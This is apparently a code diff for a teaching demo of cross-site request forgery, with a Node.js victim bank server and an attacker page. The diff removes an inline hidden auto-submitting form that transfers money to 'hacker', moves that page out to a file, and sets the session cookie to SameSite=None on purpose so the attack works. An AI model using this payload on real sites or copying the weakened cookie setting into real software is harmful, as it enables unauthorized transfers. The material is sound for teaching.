@@ -1,6 +1,8 @@
 const http = require('http')
 const qs = require('querystring')
 const URL = require('url')
+const fs = require('fs')
+const { formatWithOptions } = require('util')
 
 // 模拟账户
 const account = {
@@ -15,7 +17,7 @@ const routes = {
     if (!from && req.path !== '/login') return res.end('请先登录')
     switch (req.path) {
       case '/login': // 登录接口
-        res.setHeader('Set-Cookie', ['session=keliq; httpOnly=true;']) // 设置 httpOnly Cookie 不能阻止 CSRF 攻击
+        res.setHeader('Set-Cookie', ['session=keliq; httpOnly=true; sameSite=None; secure=true']) // 设置 httpOnly Cookie 不能阻止 CSRF 攻击
         res.end('<h2>欢迎您，keliq！</h2>')
         break
       case '/balance': // 余额查询接口
@@ -40,20 +42,14 @@ const routes = {
   },
   '127.0.0.1:4000': (req, res) => {
     // 请使用 Firefox 或 Safari 测试（新版 Chrome 浏览器 cookie samesite 默认值为 Lax，所以 POST 攻击方式不可行，除非源站设置 SameSite=None; Secure;
-    res.end(`
-      <h2>看起来像正规网站，你永远不知道背后发生了什么！</h2>
-      <iframe name="hideIframe" style="display: none"></iframe>
-      <form
-        id="form" target="hideIframe" method="POST"
-        enctype="application/x-www-form-urlencoded"
-        action="http://localhost:3000/transfer"
-        style="display: none"
-      >
-        <input type="text" name="to" value="hacker" />
-        <input type="number" name="money" value="100" />
-      </form>
-      <script>form.submit()</script>`)
-  },
+    fs.readFile('./post.html', (err, data) => {
+      if (err) {
+        res.end('err')
+        return
+      }
+      res.end(data.toString())
+    })
+  }
 }
 
 function onRequest(req, res) {
